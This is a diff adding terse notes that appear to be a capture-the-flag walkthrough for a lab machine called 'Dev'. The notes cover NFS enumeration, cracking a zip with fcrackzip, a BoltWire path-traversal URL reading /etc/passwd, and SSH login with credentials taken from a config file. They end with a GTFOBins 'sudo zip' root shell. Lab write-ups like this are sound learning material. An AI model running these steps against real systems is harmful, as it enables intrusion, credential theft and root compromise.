@@ -1,0 +1,28 @@
+Dev
+- nmap: 2049/tcp  open  nfs      3-4 (RPC #100003)
+- showmount -e 192.168.194.134
+	- /srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+- sudo mount -t nfs 192.168.194.134:/srv/nfs /mnt/dev
+	- cd /mnt/dev to see save.zip
+- tools to crack password protected zip files:
+	- ./zip-password-finder --inputFile /mnt/dev/save.zip -> brute force
+	- fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+		- -v: verbose
+		- -u: unzipping
+		- -D :dictionary attack
+		- -p: use (attack) a specified file
+		- PASSWORD FOUND!!!!: pw == java101
+		- id_rsa and to_do.txt
+			- id_rsa is a key used for ssh
+- ffuf directory fuzz reveals 192.168.194.134/app, which includes /config/config.yaml featuring a db username and password
+	- also revels 192.168.194.134:8080/dev that includes "boltwire"
+		- we can then google boltwire exploit
+		- https://www.exploit-db.com/exploits/48411
+		- http://192.168.194.134:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+			- this tells us the username jeanpaul, we can now use this username + the password form the yaml file + the id_rsa key to ssh into jeanpaul@dev
+- as jeanpaul we can run *sudo -l* to see what commands we can run with sudo priviledges without a password
+	- we can run zip: (root) NOPASSWD: /usr/bin/zip
+- gtfobins.github.io then gives us the commands to run (as jeanpaul) to gain root (found on gtfobins by sorting for zip and sudo)
+	- *TF=$(mktemp -u)*
+	- *sudo zip $TF /etc/hosts -T -TT 'sh #'*
+	- *sudo rm $TF*
